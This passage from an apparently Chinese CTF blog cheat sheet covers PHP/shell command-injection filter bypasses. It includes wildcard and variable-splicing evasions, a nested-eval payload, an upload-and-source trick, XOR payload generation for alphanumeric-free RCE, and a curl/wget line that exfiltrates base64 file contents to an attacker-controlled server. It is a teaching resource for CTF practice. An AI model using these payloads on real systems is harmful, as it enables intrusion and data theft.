<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag.php ==&gt; flag.???
</span></span><span class="line"><span class="cl">             flag*
</span></span><span class="line"><span class="cl">             ……
</span></span></code></pre></td></tr></table>
</div>
</div><p>还可以通配来匹配命令，但需要全路径</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">例如：
</span></span><span class="line"><span class="cl">/bin/ca?
</span></span><span class="line"><span class="cl">相当于cat命令
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="变量拼接绕过正则" class="headerLink">
    <a href="#%e5%8f%98%e9%87%8f%e6%8b%bc%e6%8e%a5%e7%bb%95%e8%bf%87%e6%ad%a3%e5%88%99" class="header-mark"></a>变量拼接绕过正则</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">以flag.php为例:
</span></span><span class="line"><span class="cl">x=lag;cat f$x.php
</span></span><span class="line"><span class="cl">相当于:
</span></span><span class="line"><span class="cl">cat flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="输入字符串长度限制" class="headerLink">
    <a href="#%e8%be%93%e5%85%a5%e5%ad%97%e7%ac%a6%e4%b8%b2%e9%95%bf%e5%ba%a6%e9%99%90%e5%88%b6" class="header-mark"></a>输入字符串长度限制</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># cat flag</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>suifeng<span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># touch &#34;ag&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># touch &#34;fl\\&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># touch &#34;t \\&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># touch &#34;ca\\&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># s -t</span>
</span></span><span class="line"><span class="cl">ca<span class="se">\ </span>t <span class="se">\ </span>fl<span class="se">\ </span>ag shell flag
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># ls -t &gt;shell</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># sh shell</span>
</span></span><span class="line"><span class="cl">shell: line 1: shell: <span class="nb">command</span> not found
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>suifeng<span class="o">}</span>
</span></span><span class="line"><span class="cl">shell: line 6: flag: <span class="nb">command</span> not found
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@kali flag123<span class="o">]</span><span class="c1"># ls</span>
</span></span><span class="line"><span class="cl">ag ca<span class="se">\ </span>fl  flag shell t <span class="se">\ </span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">  #  \指的是换行
</span></span><span class="line"><span class="cl">  #  ls -t是将文本按时间排序输出
</span></span><span class="line"><span class="cl">  #  ls -t &gt;shell  将输出输入到shell文件中
</span></span><span class="line"><span class="cl">  #  sh将文本中的文字读取出来执行
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="内联执行" class="headerLink">
    <a href="#%e5%86%85%e8%81%94%e6%89%a7%e8%a1%8c" class="header-mark"></a>内联执行</h2><p>内联执行就是在一条shell语句中内嵌子shell语句,用主shell语句处理子语句的结果</p>
<p>可用于内联语句的符号 ${},``（反引号）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">echo</span><span class="w"> </span><span class="o">`</span><span class="n">ls</span><span class="o">`</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">echo</span><span class="w"> </span><span class="err">${</span><span class="n">ls</span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">相当于把</span><span class="n">ls的结果使用echo输出</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="截取环境变量拼接" class="headerLink">
    <a href="#%e6%88%aa%e5%8f%96%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f%e6%8b%bc%e6%8e%a5" class="header-mark"></a>“${}”截取环境变量拼接</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>root@kali ~<span class="o">]</span><span class="c1"># echo $PATH</span>
</span></span><span class="line"><span class="cl">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@kali ~<span class="o">]</span><span class="c1"># echo ${PATH:5:1}${PATH:2:1}</span>
</span></span><span class="line"><span class="cl">ls
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">14</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">5</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span> flag.txt
</span></span><span class="line"><span class="cl">在此环境中相当于 nl flag.txt
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="中括号匹配绕过" class="headerLink">
    <a href="#%e4%b8%ad%e6%8b%ac%e5%8f%b7%e5%8c%b9%e9%85%8d%e7%bb%95%e8%bf%87" class="header-mark"></a>[]中括号匹配绕过</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/<sup>a-c][h-j][m-o</sup>/<sub>b-d</sub>a[s-u] flag.txt
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">相当于
</span></span><span class="line"><span class="cl">/bin/cat flag.txt
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">因为[]匹配范围只在当前路径
</span></span><span class="line"><span class="cl">所以要为bin绝对路径
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="source命令" class="headerLink">
    <a href="#source%e5%91%bd%e4%bb%a4" class="header-mark"></a>source命令：</h2><p>source命令，又称点命令,可以用点号( . ),代替</p>
<p>该命令可以读取并执行文件中的命令</p>
<p>可构建文件上传表单，上传命令文件执行</p>
<p>表单：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>POST数据包POC<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">&lt;!--链接是当前打开的题目链接--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;</span>文件名：<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;提交&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>get请求为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=.+/???/????????[@-[]
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="嵌套eval函数绕过" class="headerLink">
    <a href="#%e5%b5%8c%e5%a5%97eval%e5%87%bd%e6%95%b0%e7%bb%95%e8%bf%87" class="header-mark"></a>嵌套eval函数绕过</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=eval($_GET[a]);&amp;a=system(&#39;cat flag.php&#39;);
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload共传递了两个参数</span><span class="err">，第一个为嵌套</span><span class="n">eval第二个为向嵌套的eval传入参数</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="已知的其他函数拼凑所需字符串" class="headerLink">
    <a href="#%e5%b7%b2%e7%9f%a5%e7%9a%84%e5%85%b6%e4%bb%96%e5%87%bd%e6%95%b0%e6%8b%bc%e5%87%91%e6%89%80%e9%9c%80%e5%ad%97%e7%ac%a6%e4%b8%b2" class="header-mark"></a>已知的其他函数拼凑所需字符串</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个&#34;.&#34;
</span></span><span class="line"><span class="cl">pos():输出数组第一个元素，不改变指针；
</span></span><span class="line"><span class="cl">scandir();遍历目录，这里因为参数为&#34;.&#34;所以遍历当前目录
</span></span><span class="line"><span class="cl">array_reverse():元组倒置
</span></span><span class="line"><span class="cl">next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
</span></span><span class="line"><span class="cl">show_source():查看源码
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>使用pos(localeconv)来获取小数点</strong></p>
<h2 id="无回显rce" class="headerLink">
    <a href="#%e6%97%a0%e5%9b%9e%e6%98%berce" class="header-mark"></a><strong>无回显rce</strong></h2><p>无回显的执行函数：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exec()
</span></span><span class="line"><span class="cl">shell_exec()
</span></span><span class="line"><span class="cl">``（反引号）
</span></span></code></pre></td></tr></table>
</div>
</div><p>这些需要php函数echo才可以输出结果</p>
<h3 id="复制到可访问文件" class="headerLink">
    <a href="#%e5%a4%8d%e5%88%b6%e5%88%b0%e5%8f%af%e8%ae%bf%e9%97%ae%e6%96%87%e4%bb%b6" class="header-mark"></a>复制到可访问文件</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">先将根目录复制到某个文件，然后访问查看
</span></span><span class="line"><span class="cl">ls /| tee ls.txt
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">然后输入 url/1.txt  即可查看根目录
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">再复制flag文件，然后访问查看
</span></span><span class="line"><span class="cl">cat /flag.php | tee flag.txt
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">然后输入 url/falg.txt  即可查看根目录
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">还可以使用其他的复制方法
</span></span><span class="line"><span class="cl">copy /flag.php flag.txt
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">mv /flag.php flag.txt
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="dnslog外带数据" class="headerLink">
    <a href="#dnslog%e5%a4%96%e5%b8%a6%e6%95%b0%e6%8d%ae" class="header-mark"></a>dnslog外带数据</h3><p>需要dnslog平台，可自己搭建</p>
<p>在自己的公网ip的网站目录下建立一个record.php的文件，里面写下如下代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">    $data =$_GET[&#39;data&#39;];
</span></span><span class="line"><span class="cl">    $f = fopen(&#34;flag.txt&#34;, &#34;w&#34;);
</span></span><span class="line"><span class="cl">    fwrite($f,$data);
</span></span><span class="line"><span class="cl">    fclose($f);
</span></span><span class="line"><span class="cl">    ?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后构造请求</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">curl http://*.*.*.**/record.php?data=`catflag|base64`
</span></span><span class="line"><span class="cl">wget http://*.*.*.*/record.php?data=`catflag|base64`
</span></span></code></pre></td></tr></table>
</div>
</div><p>进行编码防止数据不全等问题</p>
<h3 id="devnull-21类无回显" class="headerLink">
    <a href="#devnull-21%e7%b1%bb%e6%97%a0%e5%9b%9e%e6%98%be" class="header-mark"></a>&gt;/dev/null 2&gt;&amp;1类无回显</h3><p>用分隔符进行分割即可绕过</p>
<h2 id="uaf脚本绕过disable_function" class="headerLink">
    <a href="#uaf%e8%84%9a%e6%9c%ac%e7%bb%95%e8%bf%87disable_function" class="header-mark"></a>uaf脚本绕过disable_function</h2><p>具体脚本看web72</p>
<h2 id="无字母数字rce" class="headerLink">
    <a href="#%e6%97%a0%e5%ad%97%e6%af%8d%e6%95%b0%e5%ad%97rce" class="header-mark"></a>无字母数字RCE</h2><h3 id="异或" class="headerLink">
    <a href="#%e5%bc%82%e6%88%96" class="header-mark"></a>异或</h3><p>脚本生成包含所有可见字符的异或构造结果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;res.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$contents</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span><span class="mi">256</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">          <span class="nv">$hex_i</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nv">$hex_i</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">          <span class="nv">$hex_j</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nv">$hex_j</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$preg</span> <span class="o">=</span> <span class="s1">&#39;/[a-z0-9]/i&#39;</span><span class="p">;</span> <span class="c1">//根据题目给的正则表达式修改即可
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_i</span><span class="p">))</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_j</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl">              <span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">^</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">32</span><span class="o">&amp;</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nv">$contents</span><span class="o">=</span><span class="nv">$contents</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$contents</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>运行python脚本生成payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">       <span class="n">s1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="n">s2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arg</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">           <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;res.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
